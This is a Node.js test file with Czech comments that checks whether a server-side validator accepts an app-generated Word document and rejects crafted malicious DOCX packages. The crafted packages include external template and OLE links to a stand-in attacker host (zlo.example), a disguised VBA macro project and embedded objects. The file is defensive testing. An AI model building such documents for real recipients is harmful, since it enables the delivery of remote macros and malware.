/* ============================================================
 * PO #116 — KONTROLA WORDU PŘIKLÁDANÉHO K DEALU (revize PO R5, dorevize D1)
 *
 * pdOdeslaniDocx (netlify/lib/pd_odeslani.mjs) kontroluje rozbalený Word
 * TOUŽ funkcí jako šablony (sablonaObsahVadyZipu):
 *   1. Word vygenerovaný aplikací (docxDokumentBlob → docxVyplnSablonu
 *      s nabidkaData nad smyšlenou zakázkou — žádná firemní šablona) projde;
 *   2. pět průniků z dorevize se odmítne: vnější attachedTemplate, aFChunk,
 *      vnější oleObject, [Content_Types].xml v UTF-16 s vbaProject
 *      (přejmenovaná část) a %-kódovaný název word/vba%50roject.bin;
 *   3. dřívější odmítnutí platí dál (vbaProject.bin, embeddings, macroEnabled,
 *      neplatný ZIP, chybějící document.xml).
 * Spuštění: node src/test_po_116_docx.js
 * ============================================================ */
const nacti = (f) => { const m = require(f); Object.keys(m).forEach(k => { if (global[k] === undefined) global[k] = m[k]; }); return m; };
const ZC = require('./zkusebni_cenik.js');
nacti('./format.js'); nacti('./preklad.js'); nacti('./engine.js');
global.DEFAULT_CENIK = ZC.zkusebniCenik();
nacti('./engine_proj.js');
global.DEFAULT_CENIK_PROJ = ZC.zkusebniCenikProj();
nacti('./techspec.js'); nacti('./sleva.js'); nacti('./zaokrouhleni.js'); nacti('./firma.js');
const zk = nacti('./zakazka.js');
const N = require('./nabidka.js');
const DG = nacti('./docxgen.js');
nacti('./sablona_obsah.js');
const J = require('./jekly.json');

let ok = 0, fail = 0;
const test = (n, c, info) => { if (c) { ok++; console.log('OK   ' + n); }
  else { fail++; console.log('FAIL ' + n, info === undefined ? '' : JSON.stringify(info).slice(0, 400)); } };
const enc = new TextEncoder();
const b64 = async (blob) => Buffer.from(await blob.arrayBuffer()).toString('base64');
const zip = (casti) => DG.zipZapis(casti.map(([nazev, obsah]) => ({ nazev, data: typeof obsah === 'string' ? enc.encode(obsah) : obsah })));
const CT = '<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
  + '<Default Extension="xml" ContentType="application/xml"/></Types>';
const DOC = '<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p/></w:body></w:document>';
const REL = (typ, cil, ext) => '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
  + '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/' + typ + '" Target="' + cil + '"'
  + (ext ? ' TargetMode="External"' : '') + '/></Relationships>';
const utf16 = (t) => Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(t, 'utf16le')]);

(async () => {
  const { pdOdeslaniDocx } = await import('../netlify/lib/pd_odeslani.mjs');

  /* 1. Word vygenerovaný aplikací nad smyšlenou zakázkou. */
  const z = zk.novaZakazka();
  z.cislo = '2026-OPR-CN-0116'; z.objednatel = 'Zkušební odběratel s.r.o.'; z.nazevAkce = 'TEST PO';
  const v = z.varianty[0];
  Object.assign(v.data.ock.zadani, { prejezd: 3.3, zdvih: 12, prohluben: 1.2, sirka: 1.6, hloubka: 2.1 });
  const data = N.nabidkaData(z, v, J, 'cz');
  const sablona = await DG.docxDokumentBlob('Nabídka {{CISLO_NABIDKY}}', [
    { sekce: 'KONSTRUKČNÍ ŘEŠENÍ ŠACHTY', radky: [['ROZMĚRY', '{{TS_ROZMERY}}'], ['OBJEDNATEL', '{{OBJEDNATEL}}']] },
    { sekce: 'CENA', radky: [['VÝTAHOVÁ ŠACHTA', '{{CENA_BEZ_DPH}} bez DPH'], ['CELKEM', '{{CENA_S_DPH}} včetně DPH']] }]);
  const vystup = await DG.docxVyplnSablonu(await sablona.arrayBuffer(), data.placeholders, [], {}, { radkyNavic: data.tsRadkyNavic });
  const gen = await pdOdeslaniDocx(await b64(vystup));
  test('Word vygenerovaný aplikací (generátor z repa, smyšlená zakázka) projde', !gen.chyba && gen.data && gen.data.length > 100, gen);
  const text = new TextDecoder().decode((await DG.zipPrecti(new Uint8Array(await vystup.arrayBuffer()))).find(p => p.nazev === 'word/document.xml').data);
  test('…a nese vyplněné údaje nabídky (není to prázdná kostra)', text.includes('2026-OPR-CN-0116') && text.includes('Zkušební odběratel'), text.slice(0, 200));

  /* 2. Pět průniků z dorevize D1 — kontrola šablon je odmítne, teď i pdOdeslaniDocx. */
  const prunik = [
    ['vnější attachedTemplate (stažení cizí šablony s makry)', [['[Content_Types].xml', CT], ['word/document.xml', DOC],
      ['word/_rels/settings.xml.rels', REL('attachedTemplate', 'http://zlo.example/makra.dotm', true)]]],
    ['vztah aFChunk (vložený cizí dokument)', [['[Content_Types].xml', CT], ['word/document.xml', DOC],
      ['word/_rels/document.xml.rels', REL('aFChunk', 'afchunk.htm', false)], ['word/afchunk.htm', '<html></html>']]],
    ['vnější odkaz oleObject', [['[Content_Types].xml', CT], ['word/document.xml', DOC],
      ['word/_rels/document.xml.rels', REL('oleObject', 'http://zlo.example/x.bin', true)]]],
    ['[Content_Types].xml v UTF-16 s vbaProject (přejmenovaná část)', [['[Content_Types].xml', utf16(CT.replace('</Types>',
      '<Override PartName="/word/data.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'))], ['word/document.xml', DOC], ['word/data.bin', 'x']]],
    ['%-kódovaný název word/vba%50roject.bin', [['[Content_Types].xml', CT], ['word/document.xml', DOC], ['word/vba%50roject.bin', 'x']]],
  ];
  for (const [jak, casti] of prunik) {
    const r = await pdOdeslaniDocx(await b64(zip(casti)));
    test('D1: ' + jak + ' → 400', r.status === 400 && /nepřiloží/.test(r.chyba || ''), r);
  }

  /* 3. Dřívější odmítnutí (R5). */
  const dalsi = [
    ['word/vbaProject.bin', [['[Content_Types].xml', CT], ['word/document.xml', DOC], ['word/vbaProject.bin', 'x']]],
    ['embeddings/oleObject1.bin', [['[Content_Types].xml', CT], ['word/document.xml', DOC], ['word/embeddings/oleObject1.bin', 'x']]],
    ['typ obsahu macroEnabled', [['[Content_Types].xml', CT.replace('</Types>', '<Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')], ['word/document.xml', DOC]]],
    ['chybí word/document.xml', [['[Content_Types].xml', CT]]],
  ];
  for (const [jak, casti] of dalsi) {
    const r = await pdOdeslaniDocx(await b64(zip(casti)));
    test('R5: ' + jak + ' → 400', r.status === 400, r);
  }
  const pk = await pdOdeslaniDocx(Buffer.from('PK\u0003\u0004[Content_Types].xml word/document.xml xxxxxxxxxxxxxxxx').toString('base64'));
  test('R5: neplatný ZIP s podřetězci → 400', pk.status === 400, pk);
  const bezKontroly = await pdOdeslaniDocx(await b64(zip([['[Content_Types].xml', CT], ['word/document.xml', DOC]])), {});
  test('bez načtené kontroly obsahu se Word nepřiloží (503)', bezKontroly.status === 503, bezKontroly);

  console.log('\n' + ok + ' OK, ' + fail + ' FAIL');
  process.exit(fail ? 1 : 0);
})();
